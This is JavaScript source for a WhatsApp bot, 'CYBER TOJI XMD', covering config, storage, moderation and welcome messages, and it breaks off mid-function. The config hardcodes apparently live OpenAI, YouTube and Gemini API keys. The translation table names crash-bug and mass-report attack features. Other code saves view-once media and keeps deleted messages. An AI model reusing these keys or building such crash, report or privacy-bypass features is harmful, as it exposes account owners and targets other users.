import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  delay,
  downloadContentFromMessage
} from '@whiskeysockets/baileys';
import qrcode from 'qrcode-terminal';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import * as cheerio from 'cheerio';

// Bot configuration
const config = {
  botName: '𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃',
  prefix: '!',
  language: 'ar', // 'ar' = Arabe, 'fr' = Français, 'en' = English
  autoReply: false,
  sessionFolder: './auth_info_baileys',
  usePairingCode: true,
  phoneNumber: '', // Format: '33612345678'
  adminNumbers: ['50943981073@s.whatsapp.net', '129459608879262@lid', '50944908407@s.whatsapp.net', '84896130992@s.whatsapp.net'], // Admins
  botAdmins: ['50943981073', '50944908407', '67078035882', '84896130992'], // Liste des numéros admin (sans @s.whatsapp.net)
  dataFolder: './bot_data',
  maxViewOncePerUser: 50,
  commandCooldown: 2000, // 2 secondes entre les commandes
  youtubeApiKey: 'AIzaSyD3JA07YzY6SJSHKtj9IA7S-GFZUkqYd70', // 🔑 Clé API YouTube Data v3
  openaiApiKey:  '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', // 🔑 Clé API OpenAI GPT
  geminiApiKey:  'AIzaSyAj5kNv4ClFt-4DskW6XDU0PIPd3PXmwCw',  // 🔑 Clé API Google Gemini
  groqApiKey:    '',  // 🔑 Clé API Groq (optionnel, gratuit sur console.groq.com)
  channelLink:   'https://whatsapp.com/channel/0029Vb7mdO3KAwEeztGPQr3U',  // 📢 Chaîne WhatsApp
  channelJid:    '120363409145514813@newsletter'
};

// Créer le dossier de données s'il n'existe pas
if (!fs.existsSync(config.dataFolder)) {
  fs.mkdirSync(config.dataFolder, { recursive: true });
}

// =============================================
// SYSTÈME DE TRADUCTION ARABE
// =============================================

const translations = {
  // Messages communs
  'للمسؤولين فقط': 'للمسؤولين فقط',
  'This command is for groups only': 'الأمر for groups only',
  'Admin command': 'الأمر مخصص للمسؤولين',
  'Usage': 'الاستخدام',
  'Exemple': 'مثال',
  'خطأ': 'خطأ',
  'نجاح': 'نجاح',
  'Failed': 'فشل',
  'جاري التحميل': 'جاري التحميل',
  'يرجى الانتظار': 'يرجى الانتظار',
  'مكتمل': 'مكتمل',
  'Target': 'الهدف',
  'Status': 'الحالة',
  
  // Commandes principales
  'Menu': 'القائمة',
  'Help': 'المساعدة',
  'Ping': 'بينغ',
  'Alive': 'نشط',
  'Info': 'معلومات',
  'Status': 'الحالة',
  
  // Messages du menu
  'User': 'المستخدم',
  'Dev': 'المطور',
  'Developer': 'المطور',
  'Region': 'المنطقة',
  'Date': 'التاريخ',
  'Time': 'الوقت',
  'Mode': 'الوضع',
  'Version': 'الإصدار',
  'Prefix': 'البادئة',
  'Bot Name': 'اسم البوت',
  
  // Commandes de groupe
  'Group': 'المجموعة',
  'Members': 'الأعضاء',
  'Admins': 'المسؤولون',
  'Online': 'متصل',
  'Offline': 'غير متصل',
  'Kicked': 'تم الطرد',
  'Added': 'تمت الإضافة',
  'Promoted': 'تمت الترقية',
  'Demoted': 'تم التخفيض',
  
  // Messages d'erreur
  'No media found': 'لم يتم العثور على وسائط',
  'Reply to a message': 'رد على رسالة',
  'اذكر شخصاً': 'اذكر شخصاً ما',
  'Invalid number': 'رقم غير صالح',
  'Command not found': 'الأمر غير موجود',
  
  // Bugs et attaques
  'KILL.GC BUG': 'خلل القتل الجماعي',
  'IOS.KILL BUG': 'خلل قتل iOS',
  'ANDRO.KILL BUG': 'خلل قتل أندرويد',
  'SILENT REPORT': 'تقرير صامت',
  'BAN SUPPORT': 'دعم الحظر',
  'MEGA BAN': 'حظر ضخم',
  
  // États
  'تم الإرسال': 'تم الإرسال',
  'تم التسليم': 'تم التسليم',
  'تم التنفيذ': 'تم التنفيذ',
  'مكتمل': 'مكتمل',
  'تم النشر': 'تم النشر',
  'محظور': 'محظور',
  'بريد مزعج': 'بريد مزعج',
  'نظيف': 'نظيف',
  'مشبوه': 'مشبوه',
  
  // Autres
  'الحمولة': 'الحمولة',
  'Reports': 'التقارير',
  'Total': 'المجموع',
  'Duration': 'المدة',
  'Speed': 'السرعة',
  'Risk': 'المخاطر',
  'Timeline': 'الجدول الزمني',
  'Details': 'التفاصيل',
  'System Status': 'حالة النظام',
  'قاعدة البيانات متزامنة': 'قاعدة البيانات متزامنة',
  'Mission accomplished': 'المهمة أنجزت'
};

// Fonction de traduction
function translate(text) {
  if (config.language !== 'ar') return text;
  
  // Traduire les mots clés
  let translatedText = text;
  for (const [key, value] of Object.entries(translations)) {
    const regex = new RegExp(key, 'gi');
    translatedText = translatedText.replace(regex, value);
  }
  
  return translatedText;
}

// Fonction pour envelopper les messages en arabe
function msg(text) {
  return translate(text);
}

// Auto-reply keywords and responses
const autoReplies = {
  'hello': '👋 Salut! Je suis 𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃. Comment puis-je t\'aider?',
  'hi': '👋 Hello! Bienvenue sur 𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃.',
  'help': `╔══════════════════════════════╗
║      𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃         ║
╚══════════════════════════════╝

📋 Commandes disponibles:
━━━━━━━━━━━━━━━━
!help - Afficher ce menu
!ping - Vérifier la latence
!info - Informations du bot
!menu - Menu principal

Type !menu pour voir le menu complet!`,
  'bye': '👋 À bientôt! Prends soin de toi!',
  'thanks': 'De rien! 😊 - 𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃',
  'thank you': 'Avec plaisir! 😊 - 𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃'
};

// Simple in-memory database with persistence
const database = {
  users: new Map(),
  groups: new Map(),
  statistics: {
    totalالرسائل: 0,
    totalUsers: 0,
    totalGroups: 0
  }
};

// Variables pour les fonctionnalités
let botMode = 'public';
let autoTyping = false;
let autoRecording = true;
let autoReact = true;
let autoReadStatus = true;
let autoLikeStatus = true;
let antiDelete = true;
let antiEdit = true;
let antiDeleteMode = 'all'; // 'private' | 'gchat' | 'all'
let antiEditMode = 'all';   // 'private' | 'gchat' | 'all'
let antiBug = true; // ✅ Anti-Bug activé par défaut
let savedViewOnce = new Map();
let messageCache = new Map();
let groupSettings = new Map();
let memberActivity = new Map();

// 🛡️ Anti-Bug: tracker des attaques détectées
const antiBugTracker = new Map(); // { senderJid: { count, lastSeen, blocked } }

let autoreactWords = {
  'good': '👍', 'nice': '👌', 'wow': '😲',
  'lol': '😂', 'cool': '😎', 'love': '❤️',
  'fire': '🔥', 'sad': '😢', 'angry': '😠', 'ok': '👌'
};

const warnSystem = new Map();
const spamTracker = new Map();
const permaBanList = new Map();
const commandCooldowns = new Map();

// =============================================
// 🗄️ STORE LOCAL - SYSTÈME DE PERSISTANCE COMPLET
// =============================================

const STORE_DIR = './store';
const STORE_FILES = {
  config:       `${STORE_DIR}/config.json`,
  admins:       `${STORE_DIR}/admins.json`,
  warns:        `${STORE_DIR}/warns.json`,
  permabans:    `${STORE_DIR}/permabans.json`,
  groupSettings:`${STORE_DIR}/group_settings.json`,
  stats:        `${STORE_DIR}/stats.json`,
  viewonce:     `${STORE_DIR}/viewonce.json`,
  activity:     `${STORE_DIR}/activity.json`,
  antilink:     `${STORE_DIR}/antilink.json`,
  antibot:      `${STORE_DIR}/antibot.json`,
  antitag:      `${STORE_DIR}/antitag.json`,
  antispam:     `${STORE_DIR}/antispam.json`,
  welcome:      `${STORE_DIR}/welcome.json`,
  autoreact:    `${STORE_DIR}/autoreact.json`,
};

// --- Utilitaires Store ---
function storeEnsureDir() {
  if (!fs.existsSync(STORE_DIR)) {
    fs.mkdirSync(STORE_DIR, { recursive: true });
    console.log('📁 Store directory created:', STORE_DIR);
  }
  // Créer aussi le dossier legacy pour compatibilité
  if (!fs.existsSync(config.dataFolder)) {
    fs.mkdirSync(config.dataFolder, { recursive: true });
  }
}

function storeRead(file, defaultValue = {}) {
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      return JSON.parse(raw);
    }
  } catch (e) {
    console.error(`⚠️ Store read error [${file}]:`, e.message);
  }
  return defaultValue;
}

function storeWrite(file, data) {
  try {
    storeEnsureDir();
    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (e) {
    console.error(`⚠️ Store write error [${file}]:`, e.message);
    return false;
  }
}

function mapToObj(map) {
  const obj = {};
  for (const [k, v] of map.entries()) obj[k] = v;
  return obj;
}

function objToMap(obj) {
  return new Map(Object.entries(obj || {}));
}

// --- LOAD STORE (au démarrage) ---
function loadStore() {
  storeEnsureDir();

  // 1. CONFIG (botMode, toggles)
  const savedConfig = storeRead(STORE_FILES.config);
  if (Object.keys(savedConfig).length) {
    botMode        = savedConfig.botMode        ?? 'public';
    autoTyping     = savedConfig.autoTyping     ?? false;
    autoRecording  = savedConfig.autoRecording  ?? true;
    autoReact      = savedConfig.autoReact      ?? true;
    autoReadStatus = savedConfig.autoReadStatus ?? true;
    autoLikeStatus = savedConfig.autoLikeStatus ?? true;
    antiDelete     = savedConfig.antiDelete     ?? true;
    antiEdit       = savedConfig.antiEdit       ?? true;
    antiBug        = savedConfig.antiBug        ?? true;
    autoreactWords = savedConfig.autoreactWords ?? autoreactWords;
    console.log('✅ [STORE] Config chargée');
  }

  // 2. ADMINS (botAdmins + adminNumbers)
  const savedAdmins = storeRead(STORE_FILES.admins);
  if (savedAdmins.botAdmins?.length) {
    config.botAdmins   = savedAdmins.botAdmins;
    config.adminNumbers = savedAdmins.adminNumbers ?? config.adminNumbers;
    console.log(`✅ [STORE] Admins chargés: ${config.botAdmins.length} admin(s)`);
  }

  // 3. WARNS
  const savedWarns = storeRead(STORE_FILES.warns);
  for (const [k, v] of Object.entries(savedWarns)) warnSystem.set(k, v);
  if (Object.keys(savedWarns).length) console.log('✅ [STORE] Warnings chargés');

  // 4. PERMABANS
  const savedBans = storeRead(STORE_FILES.permabans);
  for (const [k, v] of Object.entries(savedBans)) permaBanList.set(k, v);
  if (Object.keys(savedBans).length) console.log('✅ [STORE] Permabans chargés');

  // 5. GROUP SETTINGS
  const savedGroups = storeRead(STORE_FILES.groupSettings);
  for (const [k, v] of Object.entries(savedGroups)) groupSettings.set(k, v);
  if (Object.keys(savedGroups).length) console.log('✅ [STORE] Paramètres groupes chargés');

  // 6. STATS
  const savedStats = storeRead(STORE_FILES.stats);
  if (Object.keys(savedStats).length) {
    Object.assign(database.statistics, savedStats);
    console.log('✅ [STORE] Statistiques chargées');
  }

  // 7. VIEW ONCE
  const savedVV = storeRead(STORE_FILES.viewonce);
  for (const [k, v] of Object.entries(savedVV)) {
    try {
      savedViewOnce.set(k, v.map(item => ({
        ...item,
        buffer: Buffer.from(item.buffer, 'base64')
      })));
    } catch(e) {}
  }
  if (Object.keys(savedVV).length) console.log('✅ [STORE] View Once chargé');

  // 8. ACTIVITY
  const savedActivity = storeRead(STORE_FILES.activity);
  for (const [groupJid, members] of Object.entries(savedActivity)) {
    memberActivity.set(groupJid, objToMap(members));
  }
  if (Object.keys(savedActivity).length) console.log('✅ [STORE] Activité chargée');

  console.log('🗄️ [STORE] Loading complet!');
}

// --- SAVE STORE (complet) ---
function saveStore() {
  storeEnsureDir();

  // 1. CONFIG
  storeWrite(STORE_FILES.config, {
    botMode, autoTyping, autoRecording, autoReact,
    autoReadStatus, autoLikeStatus, antiDelete, antiEdit, antiBug, autoreactWords,
    savedAt: new Date().toISOString()
  });

  // 2. ADMINS
  storeWrite(STORE_FILES.admins, {
    botAdmins: config.botAdmins,
    adminNumbers: config.adminNumbers,
    savedAt: new Date().toISOString()
  });

  // 3. WARNS
  storeWrite(STORE_FILES.warns, mapToObj(warnSystem));

  // 4. PERMABANS
  storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));

  // 5. GROUP SETTINGS
  storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));

  // 6. STATS
  storeWrite(STORE_FILES.stats, {
    ...database.statistics,
    savedAt: new Date().toISOString()
  });

  // 7. VIEW ONCE
  const vvData = {};
  for (const [k, v] of savedViewOnce.entries()) {
    try {
      vvData[k] = v.map(item => ({
        ...item,
        buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
      }));
    } catch(e) {}
  }
  storeWrite(STORE_FILES.viewonce, vvData);

  // 8. ACTIVITY
  const activityData = {};
  for (const [groupJid, membersMap] of memberActivity.entries()) {
    activityData[groupJid] = mapToObj(membersMap);
  }
  storeWrite(STORE_FILES.activity, activityData);
}

// --- SAVE PARTIEL (une seule clé) ---
function saveStoreKey(key) {
  switch(key) {
    case 'config':
      storeWrite(STORE_FILES.config, {
        botMode, autoTyping, autoRecording, autoReact,
        autoReadStatus, autoLikeStatus, antiDelete, antiEdit, autoreactWords,
        savedAt: new Date().toISOString()
      });
      break;
    case 'admins':
      storeWrite(STORE_FILES.admins, {
        botAdmins: config.botAdmins,
        adminNumbers: config.adminNumbers,
        savedAt: new Date().toISOString()
      });
      break;
    case 'warns':
      storeWrite(STORE_FILES.warns, mapToObj(warnSystem));
      break;
    case 'permabans':
      storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));
      break;
    case 'groupSettings':
      storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));
      break;
    case 'stats':
      storeWrite(STORE_FILES.stats, { ...database.statistics, savedAt: new Date().toISOString() });
      break;
    case 'viewonce':
      const vvData = {};
      for (const [k, v] of savedViewOnce.entries()) {
        try {
          vvData[k] = v.map(item => ({
            ...item,
            buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
          }));
        } catch(e) {}
      }
      storeWrite(STORE_FILES.viewonce, vvData);
      break;
    case 'activity':
      const actData = {};
      for (const [g, m] of memberActivity.entries()) actData[g] = mapToObj(m);
      storeWrite(STORE_FILES.activity, actData);
      break;
  }
}

// --- STORE STATUS (pour !storestatus) ---
function getStoreStatus() {
  const files = [];
  let totalSize = 0;
  for (const [key, filePath] of Object.entries(STORE_FILES)) {
    if (fs.existsSync(filePath)) {
      const stat = fs.statSync(filePath);
      const sizeKB = (stat.size / 1024).toFixed(2);
      totalSize += stat.size;
      files.push({ key, sizeKB, modified: stat.mtime.toLocaleTimeString('ar-SA') });
    } else {
      files.push({ key, sizeKB: '0.00', modified: 'لم يُنشأ بعد' });
    }
  }
  return { files, totalSizeKB: (totalSize / 1024).toFixed(2) };
}

// Auto-save toutes les 3 minutes
setInterval(() => {
  saveStore();
  console.log('💾 [STORE] Auto-save effectué');
}, 3 * 60 * 1000);

// Compatibilité with les anciens appels loadData/saveData
function loadData() { loadStore(); }
function saveData() { saveStore(); }


// =============================================
// UTILITAIRES
// =============================================

// ─── HELPER: Audio thème du bot (fichier local menu.mp3) ────────────────────
// Envoie menu.mp3 avec le même format que !playaudio
async function sendCmdAudio(sock, remoteJid) {
  try {
    const audioExts = ['.mp3', '.ogg', '.wav', '.m4a'];
    for (const ext of audioExts) {
      const filePath = `./menu${ext}`;
      if (fs.existsSync(filePath)) {
        const audioBuf = fs.readFileSync(filePath);
        const mimetype = ext === '.ogg' ? 'audio/ogg; codecs=opus' : 'audio/mpeg';
        
        // Envoyer juste l'audio sans message YouTube
        await sock.sendMessage(remoteJid, {
          audio:    audioBuf,
          mimetype: mimetype,
          fileName: `menu${ext}`
        });
        
        console.log(`[sendCmdAudio] ✅ Audio envoyé: ${filePath}`);
        return true;
      }
    }
    return false;
  } catch(e) {
    console.error('[sendCmdAudio]', e.message);
    return false;
  }
}


// ─── HELPER: Ajouter footer chaîne après les réponses ────────────────────────
async function sendWithChannelFooter(sock, remoteJid, text, options = {}) {
  const footerText = text + `\n\n📢 *Rejoins notre chaîne:* ${config.channelLink}`;
  await sock.sendMessage(remoteJid, { text: footerText, ...options });
}

// ═══ Helper: Envoyer réponse + lien chaîne + audio ═══════════════════════════


async function toBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

function isAdmin(jid) {
  if (!jid) return false;
  const n=jid.split(':')[0],p=n.split('@')[0];
  if(config.adminNumbers.some(a=>{const na=a.split(':')[0],pa=na.split('@')[0];return jid===a||n===na||p===pa||p===a||jid.includes(pa);}))return true;
  return(config.botAdmins||[]).some(num=>p.replace(/[^0-9]/g,'')===String(num).replace(/[^0-9]/g,''));
}

// Vérifier si un utilisateur est admin du groupe
async function isGroupAdmin(sock, groupJid, userJid) {
  try {
    // Le numéro du bot est TOUJOURS admin
    const botJid = sock.user.id.split(':')[0];
    const normalizedUserJid = userJid.split(':')[0];
    
    if (normalizedUserJid === botJid) {
      return true; // Le bot est toujours admin
    }
    
    const metadata = await sock.groupMetadata(groupJid);
    const participant = metadata.participants.find(p => {
      const normalizedPJid = p.id.split(':')[0];
      return normalizedPJid === normalizedUserJid;
    });
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    console.error('خطأ checking group admin:', error);
    return false;
  }
}

// Vérifier si le bot est admin du groupe
async function isBotGroupAdmin(sock, groupJid) {
  // LE BOT EST TOUJOURS ADMIN - Retourne toujours true
  return true;
  
  /* Code original commenté - Le bot n'a plus besoin d'être réellement admin
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const botJid = sock.user.id.split(':')[0];
    const participant = metadata.participants.find(p => p.id.split(':')[0] === botJid);
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    console.error('خطأ checking bot admin:', error);
    return false;
  }
  */
}

function checkCooldown(userId, commandName) {
  const key = `${userId}-${commandName}`;
  const now = Date.now();
  
  if (commandCooldowns.has(key)) {
    const lastUse = commandCooldowns.get(key);
    if (now - lastUse < config.commandCooldown) {
      return false;
    }
  }
  
  commandCooldowns.set(key, now);
  return true;
}

async function simulateTyping(sock, jid, duration = 3000) {
  if (!autoTyping) return;
  
  await sock.sendPresenceUpdate('composing', jid);
  await delay(duration);
  await sock.sendPresenceUpdate('paused', jid);
}

async function simulateRecording(sock, jid, duration = 2000) {
  if (!autoRecording) return;
  
  await sock.sendPresenceUpdate('recording', jid);
  await delay(duration);
  await sock.sendPresenceUpdate('paused', jid);
}

// Initialiser les paramètres d'un groupe
function initGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      antilink: false,
      antibot: false,
      antitag: false,
      antispam: false,
      maxWarns: 3
    });
    saveStoreKey('groupSettings'); // 💾 Sauvegarde partielle
  }
  return groupSettings.get(groupJid);
}

// =============================================
// SYSTÈME D'AVERTISSEMENTS
// =============================================

function addWarn(groupJid, userJid, reason) {
  const key = `${groupJid}-${userJid}`;
  if (!warnSystem.has(key)) {
    warnSystem.set(key, []);
  }
  
  const warns = warnSystem.get(key);
  warns.push({
    reason: reason,
    timestamp: Date.now()
  });
  
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
  return warns.length;
}

function getWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return warnSystem.get(key) || [];
}

function resetWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  warnSystem.delete(key);
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
}

// =============================================
// SYSTÈME DE PERMABAN
// =============================================

function addPermaBan(groupJid, userJid, reason, bannedBy) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.set(key, {
    userJid: userJid,
    groupJid: groupJid,
    reason: reason,
    bannedBy: bannedBy,
    timestamp: Date.now()
  });
  saveStoreKey('permabans'); // 💾 Sauvegarde partielle immédiate
}

function isPermaBanned(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.has(key);
}

function removePermaBan(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.delete(key);
  saveData();
}

function getPermaBanInfo(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.get(key);
}

function getAllPermaBans(groupJid) {
  const bans = [];
  for (const [key, value] of permaBanList.entries()) {
    if (value.groupJid === groupJid) {
      bans.push(value);
    }
  }
  return bans;
}

// =============================================
// DÉTECTION ANTI-بريد مزعج
// =============================================

function checkSpam(userJid, message) {
  const now = Date.now();
  const key = userJid;
  
  if (!spamTracker.has(key)) {
    spamTracker.set(key, []);
  }
  
  const userMessages = spamTracker.get(key);
  const recentMessages = userMessages.filter(msg => now - msg.time < 5000);
  recentMessages.push({ time: now, text: message });
  spamTracker.set(key, recentMessages);
  
  if (recentMessages.length > 5) {
    return true;
  }
  
  const textCounts = {};
  recentMessages.forEach(msg => {
    textCounts[msg.text] = (textCounts[msg.text] || 0) + 1;
  });
  
  if (Object.values(textCounts).some(count => count >= 3)) {
    return true;
  }
  
  return false;
}

// Fonction pour obtenir la région à partir du timezone
function getRegionFromTimezone() {
  // Toujours retourner Port-au-Prince, Haïti
  return 'Port-au-Prince, Haïti 🇭🇹';
}

// Fonction pour initialiser/obtenir les paramètres d'un groupe
function getGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      welcome: false,
      goodbye: false
    });
  }
  return groupSettings.get(groupJid);
}

// Fonction pour envoyer le message de bienvenue
async function sendWelcomeMessage(sock, groupJid, newMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin (créateur du groupe)
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure (timezone Haïti)
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const welcomeText = ` ┏━━━━━ ✨ ᴡᴇʟᴄᴏᴍᴇ ✨ ━━━━━┓
👤 𝐍𝐎𝐔𝐕𝐄𝐀𝐔 𝐌𝐄𝐌𝐁𝐑𝐄 : @${newMemberJid.split('@')[0]}
👋 Bienvenue parmi nous !

◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount}

📅 𝖣𝖺𝗍𝖾 : ${dateStr}
🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━┛

👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 (𝖢𝗋𝖾́𝖺𝗍𝖾𝗎𝗋) :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗥𝗘̀𝗚𝗟𝗘𝗦 𝗗𝗨 𝗚𝗥𝗢𝗨𝗣𝗘 :
𝖯𝗈𝗎𝗋 𝗀𝖺𝗋𝖽𝖾𝗋 𝗎𝗇𝖾 𝖺𝗆𝖻𝗂𝖺𝗇𝖼𝖾 𝗌𝖺𝗂𝗇𝖾 :
⛔ 𝟏. 𝖯𝖺𝗌 𝖽𝖾 𝖲𝗉𝖺𝗆
⚠️ 𝟐. 𝖯𝖺𝗌 𝖽𝖾 𝖯𝗎𝖻 / 𝖫𝗂𝖾𝗇𝗌
🤝 𝟑. 𝖱𝖾𝗌𝗉𝖾𝖼𝗍 𝖬𝗎𝗍𝗎𝖾𝗅
🔞 𝟒. 𝖢𝗈𝗇𝗍𝖾𝗇𝗎 𝖠𝗉𝗉𝗋𝗈𝗉𝗋𝗂𝖾́

💡 𝘓𝘦 𝘯𝘰𝘯-𝘳𝘦𝘴𝘱𝘦𝘤𝘵 𝘥𝘦𝘴 𝘳𝘦̀𝘨𝘭𝘦𝘴 𝘱𝘦𝘶𝘵
𝘦𝘯𝘵𝘳𝘢𝘪̂𝘯𝘦𝘳 𝘶𝘯 𝘣𝘢𝘯𝘯𝘪𝘴𝘴𝘦𝘮𝘦𝘯𝘵.

✨ 𝖯𝗋𝗈𝖿𝗂𝗍𝖾 𝖻𝗂𝖾𝗇 𝖽𝖾 𝗅𝖺 𝖼𝗈𝗆𝗆𝗎𝗇𝖺𝗎𝗍𝖾́ !
━━━━━━━━━━━━━━━━━━━━━`;

    const mentions = [newMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: welcomeText,
      mentions: mentions
    });
    
    console.log(`✅ Message de bienvenue envoyé à ${newMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error('خطأ in sendWelcomeالرسالة:', error);
  }
}

// Fonction pour envoyer le message d'au revoir
async function sendGoodbyeMessage(sock, groupJid, leftMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const goodbyeText = `┏━━━ 💨 ɢᴏᴏᴅʙʏᴇ ━━━┓

  ◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
  ◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount} 
  
  📅 𝖣𝖺𝗍𝖾 : ${dateStr}
  🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}

┗━━━━━━━━━━━━━━━━━━━━┛

👋 𝗨𝗡 𝗠𝗘𝗠𝗕𝗥𝗘 𝗡𝗢𝗨𝗦 𝗤𝗨𝗜𝗧𝗧𝗘 :
└─ @${leftMemberJid.split('@')[0]}

👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗦𝗧𝗔𝗙𝗙 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗜𝗡𝗙𝗢 :
𝖴𝗇𝖾 𝗉𝖾𝗋𝗌𝗈𝗇𝗇𝖾 𝖺 𝗊𝗎𝗂𝗍𝗍𝖾́ 𝗅'𝖺𝗏𝖾𝗇𝗍𝗎𝗋𝖾. 
𝖫𝖾 𝗀𝗋𝗈𝗎𝗉𝖾 𝖼𝗈𝗆𝗉𝗍𝖾 𝖽𝖾́𝗌𝗈𝗋𝗆𝖺𝗂𝗌 ${memberCount} 
𝗉𝖺𝗋𝗍𝗂𝖼𝗂𝗉𝖺𝗇𝗍𝗌.

💡 𝘙𝘢𝘱𝘱𝘦𝘭 : 𝘛𝘰𝘶𝘵𝘦 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘰𝘯 𝘱𝘢𝘳 𝘭𝘦 𝘴𝘵𝘢𝘧𝘧 
𝘦𝘴𝘵 𝘥𝘦́𝘧𝘪𝘯𝘪𝘵𝘪𝘷𝘦 𝘴𝘢𝘶𝘧 𝘢𝘱𝘱𝘦𝘭 𝘢𝘶𝘱𝘳𝘦̀𝘴 𝘥'𝘶𝘯 𝘢𝘥𝘮𝘪𝘯.

━━━━━━━━━━━━━━━━━━━━
👋 𝖠𝗎 𝗉𝗅𝖺𝗂𝗌𝗂𝗋 𝖽𝖾 𝗍𝖾 𝗋𝖾𝗏𝗈𝗂𝗋 !`;

    const mentions = [leftMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: goodbyeText,
      mentions: mentions
    });
    
    console.log(`✅ Message d'au revoir envoyé pour ${leftMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error('خطأ in sendGoodbyeالرسالة:', error);
  }
}

// =============================================
// CONNEXION WHATSAPP
// =============================================

async function connectToWhatsApp() {
  loadData();

  const { version, isLatest } = await fetchLatestBaileysVersion();
  console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`);

  const { state, saveCreds } = await useMultiFileAuthState(config.sessionFolder);

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: !config.usePairingCode,
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    getالرسالة: async (key) => {
      return { conversation: '' };
    }
  });

  // Handle pairing code
  if (config.usePairingCode && !sock.authState.creds.registered) {
    console.log('\n🔐 Utilisation du Pairing Code activée!\n');
    
    if (!config.phoneNumber) {
      const readline = await import('readline');
      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      const phoneNumber = await new Promise((resolve) => {
